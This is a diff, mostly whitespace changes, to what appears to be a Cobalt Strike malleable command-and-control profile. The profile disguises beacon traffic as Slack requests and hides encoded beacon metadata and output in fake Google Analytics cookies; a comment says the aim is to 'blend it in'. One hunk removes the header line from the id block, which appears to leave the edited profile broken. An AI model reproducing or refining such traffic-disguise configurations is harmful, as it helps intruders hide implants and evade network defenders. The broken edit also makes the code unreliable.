@@ -31,22 +31,22 @@ http-get {
     
     client {
 
-#        header "Host" "msdevchat.slack.com";
-	header "Accept" "*/*";
-	header "Accept-Language" "en-US";
-	header "Connection" "close";
+#       header "Host" "msdevchat.slack.com";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US";
+        header "Connection" "close";
 	
         
         metadata {
             base64url;
             
-	    append ";_ga=GA1.2.875";
-	    append ";__ar_v4=%8867UMDGS643";
-	    prepend "d=";
-#	    prepend "cvo_sid1=R456BNMD64;";
-	    prepend "_ga=GA1.2.875;";
-	    prepend "b=.12vPkW22o;";
-	    header "Cookie";
+            append ";_ga=GA1.2.875";
+            append ";__ar_v4=%8867UMDGS643";
+            prepend "d=";
+    #	    prepend "cvo_sid1=R456BNMD64;";
+            prepend "_ga=GA1.2.875;";
+            prepend "b=.12vPkW22o;";
+            header "Cookie";
 
         }
 
@@ -116,14 +116,13 @@ http-post {
         output {
             base64url;
 	    
-	    append ";_ga=GA1.2.875";
-	    append "__ar_v4=%8867UMDGS643";
-	    prepend "d=";
-#	    prepend "cvo_sid1=R456BNMD64;";
-	    prepend "_ga=GA1.2.875;";
-	    prepend "b=.12vPkW22o;";
-	    header "Cookie";
-
+            append ";_ga=GA1.2.875";
+            append "__ar_v4=%8867UMDGS643";
+            prepend "d=";
+    #	    prepend "cvo_sid1=R456BNMD64;";
+            prepend "_ga=GA1.2.875;";
+            prepend "b=.12vPkW22o;";
+            header "Cookie";
 
         }
 
@@ -131,8 +130,7 @@ http-post {
         id {
 #not sure on this, just trying to blend it in.
             base64url;
-	    prepend "GA1.";
-	    header "_ga";
+            prepend "GA1.";
 
         }
     }
@@ -170,25 +168,25 @@ http-stager {
     set uri_x64 "/messages/DALBNSF25";
 
     client {
-	header "Accept" "*/*";
-	header "Accept-Language" "en-US,en;q=0.5";
-	header "Accept-Encoding" "gzip, deflate";
-	header "Connection" "close";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US,en;q=0.5";
+        header "Accept-Encoding" "gzip, deflate";
+        header "Connection" "close";
     }
 
     server {
-	header "Content-Type" "text/html; charset=utf-8";        
+	    header "Content-Type" "text/html; charset=utf-8";
         header "Connection" "close";
-	header "Server" "Apache";
-	header "X-XSS-Protection" "0";
-	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
-	header "Referrer-Policy" "no-referrer";
-	header "X-Slack-Backend" "h";
-	header "Pragma" "no-cache";
-	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
-	header "X-Frame-Options" "SAMEORIGIN";
-	header "Vary" "Accept-Encoding";
-	header "X-Via" "haproxy-www-suhx";
+        header "Server" "Apache";
+        header "X-XSS-Protection" "0";
+        header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
+        header "Referrer-Policy" "no-referrer";
+        header "X-Slack-Backend" "h";
+        header "Pragma" "no-cache";
+        header "Cache-Control" "private, no-cache, no-store, must-revalidate";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "Vary" "Accept-Encoding";
+        header "X-Via" "haproxy-www-suhx";
     
     }
 
